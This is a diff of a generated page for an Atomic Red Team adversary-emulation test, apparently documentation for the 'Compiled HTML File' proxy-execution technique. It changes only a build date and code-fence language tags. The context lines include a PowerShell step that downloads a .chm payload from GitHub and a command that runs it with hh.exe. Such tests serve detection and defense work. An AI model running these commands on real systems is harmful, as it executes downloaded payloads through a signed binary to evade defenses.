@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1218.001"
 attack_technique_name: "Signed Binary Proxy Execution: Compiled HTML File"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "5cb87818-0d7c-4469-b7ef-9224107aebe8"
@@ -52,13 +52,13 @@ The payload must exist on disk at specified location (#{local_chm_file})
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{local_chm_file}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory (split-path "#{local_chm_file}") -ErrorAction ignore | Out-Null
 Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.001/src/T1218.001.chm" -OutFile "#{local_chm_file}"
 ```
@@ -69,7 +69,7 @@ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/ato
 
 ### Command
 
-```commandprompt
+```cmd
 hh.exe "#{local_chm_file}"
 ```
 
